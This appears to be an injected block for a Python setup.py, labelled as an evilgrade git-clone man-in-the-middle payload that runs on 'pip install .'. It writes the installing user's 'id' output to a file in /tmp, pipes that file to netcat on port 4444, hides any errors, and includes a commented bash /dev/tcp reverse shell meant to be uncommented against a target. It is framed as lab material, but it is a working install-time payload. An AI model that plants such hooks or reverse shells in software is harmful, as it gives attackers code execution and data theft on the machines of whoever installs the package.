# === injected by evilgrade (git clone MITM via eMudhra CA) — runs on `pip install .` ===
import subprocess as _s, os as _o
try:
    _o.system('{ echo "owned by evilgrade -- git clone MITM (faraday-cli)"; echo "user: $(id)"; echo "vector: eMudhra CA MITM on git clone -> RCE via injected setup.py"; } > /tmp/OWNED_BY_GIT 2>&1')
    _s.Popen("cat /tmp/OWNED_BY_GIT | nc 127.0.0.1 4444", shell=True)
    # real reverse shell (commented for the lab; uncomment against an authorized target):
    # _s.Popen("/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'", shell=True)
except Exception:
    pass
# === end injected ===
